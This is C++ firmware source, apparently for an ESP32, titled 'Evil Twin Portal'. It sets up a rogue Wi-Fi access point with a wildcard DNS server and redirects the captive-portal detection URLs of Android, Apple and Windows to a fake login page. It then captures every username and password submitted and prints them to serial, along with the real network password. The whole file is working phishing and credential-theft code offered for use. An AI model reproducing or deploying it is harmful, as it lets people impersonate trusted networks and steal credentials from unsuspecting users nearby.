String getLoginPage(const String& message = "") {
    String page = FPSTR(loginHTML);
    if (!message.isEmpty()) {
        page.replace("%MESSAGE%", "<div class='error'>" + message + "</div>");
    } else {
        page.replace("%MESSAGE%", "<div class='success'>Please login to access the network</div>");
    }
    return page;
}

void setup() {
    Serial.begin(115200);
    delay(1000);

    Serial.println("\n🚀 Starting Evil Twin Portal");
    Serial.println("=============================");

    // Setup Access Point
    WiFi.softAP(AP_SSID, AP_PASS);
    
    Serial.print("📶 AP Started: ");
    Serial.println(AP_SSID);
    Serial.print("📍 IP Address: ");
    Serial.println(WiFi.softAPIP());
    Serial.print("📡 MAC Address: ");
    Serial.println(WiFi.softAPmacAddress());

    // Setup DNS Server for Captive Portal
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.println("🔧 DNS Server started");

    // Setup Web Server Routes
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (clientAuthenticated) {
            request->send(200, "text/html", getSuccessPage());
        } else {
            request->send(200, "text/html", getLoginPage());
        }
    });

    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasArg("username") && request->hasArg("password")) {
            capturedUsername = request->arg("username");
            capturedPassword = request->arg("password");

            Serial.println("\n🔐 Login Attempt Captured");
            Serial.println("========================");
            Serial.print("👤 Username: ");
            Serial.println(capturedUsername);
            Serial.print("🔒 Password: ");
            Serial.println(capturedPassword);
            Serial.print("✅ Correct Password: ");
            Serial.println(REAL_PASSWORD);
            Serial.println("========================");

            if (capturedPassword == REAL_PASSWORD) {
                clientAuthenticated = true;
                Serial.println("🎉 CLIENT AUTHENTICATED SUCCESSFULLY!");
                request->send(200, "text/html", getSuccessPage());
            } else {
                Serial.println("❌ INVALID PASSWORD - KEEPING IN CAPTIVE PORTAL");
                request->send(200, "text/html", getLoginPage("Invalid password. Please try again."));
            }
        } else {
            request->send(200, "text/html", getLoginPage("Please enter both username and password."));
        }
    });

    // Captive Portal Detection Routes
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });

    server.begin();
    Serial.println("🌐 Web Server started");
    Serial.println("==================================");
    Serial.println("📱 Connect to WiFi: " + String(AP_SSID));
    Serial.println("🌐 Then open any website to see login portal");
    Serial.println("==================================");
}

void loop() {
    dnsServer.processNextRequest();
    delay(10);
}
